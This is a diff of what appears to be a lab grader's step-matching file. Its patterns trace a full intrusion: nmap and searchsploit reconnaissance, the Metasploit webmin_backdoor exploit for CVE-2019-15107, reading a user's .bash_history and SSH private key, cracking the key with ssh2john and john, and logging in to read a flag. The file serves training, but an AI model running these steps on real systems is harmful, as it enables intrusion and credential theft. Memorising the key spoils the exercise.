@@ -1,18 +1,18 @@
-nmap.* (\s\d*\.\d*\.\d*\.\d*)?|db_nmap nmap.* (\s\d*\.\d*\.\d*\.\d*)?
-cat /etc/services|cat services|searchsploit webmin|nmap.*(-sV)+ (\s\d*\.\d*\.\d*\.\d*)?
-msfconsole
-search webmin|search cve 2019-15107
-use /exploit/unix/webapp/webmin_backdoor|use exploit/unix/webapp/webmin_backdoor|use unix/webapp/webmin_backdoor|use webapp/webmin_backdoor|use webmin_backdoor
-show options
-set.*
-check exploit_used|check rhost_set|check rport_set|check lhost_set
-run.*|exploit.*
-cat /root/WARNING-READ-ME.txt|cat WARNING-READ-ME.txt
-ls -a /home/eve|ls -a eve.*|ls -a
-cat \.bash_history|cat /home/eve/.bash_history|less \.bash_history|less /home/eve/\.bash_history|more \.bash_history|more /home/eve/\.bash_history
-cat /home/eve/\.ssh/id_rsa|cat \.ssh/id_rsa|less /home/eve/\.ssh/id_rsa|less \.ssh/id_rsa
-python ssh2john.py.*\s(>)?.*
-john --wordlist /usr/share/wordlists/rockyou.txt.*
-chmod 0600.*
-ssh -i.* eve@(\d*\.\d*\.\d*\.\d*)?
-cat flag.txt|cat top-secret/flag.txt
+*,nmap db_nmap|\d*\.\d*\.\d*\.\d*,*
+*,cat searchsploit nmap|/etc/services services webmin -sV,*
+*,msfconsole|,*
+*,search|webmin CVE-2019-15107 2019-15107,*
+*,use|/exploit/unix/webapp/webmin_backdoor exploit/unix/webapp/webmin_backdoor unix/webapp/webmin_backdoor webapp/webmin_backdoor webmin_backdoor,*
+*,show|options,*
+*,set|LPORT LHOST RPORT PORTS RHOSTS PAYLOAD TARGET TARGETURL SSL,*
+*,check|exploit_used check rhost_set rport_set lhost_set,*
+*,run exploit|,*
+*,cat less more nano leafpad editor head tail|/root/WARNING-READ-ME.txt WARNING-READ-ME.txt,*
+*,ls|-a /home/eve,*
+*,cat less more leafpad nano editor head tail find|\.bash_history /home/eve/\.bash_history,*
+*,cat less more leafpad nano editor head tail find|/home/eve/\.ssh/id_rsa \.ssh/id_rsa id_rsa,*
+*,python|ssh2john\.py,*
+*,john|--wordlist /usr/share/wordlists/rockyou.txt,*
+*,chmod|600 400 0600 0400,*
+*,ssh|-i eve\@\d*\.\d*\.\d*\.\d*,*
+*,cat less more head tail|flag.txt top-secret/flag.txt,*
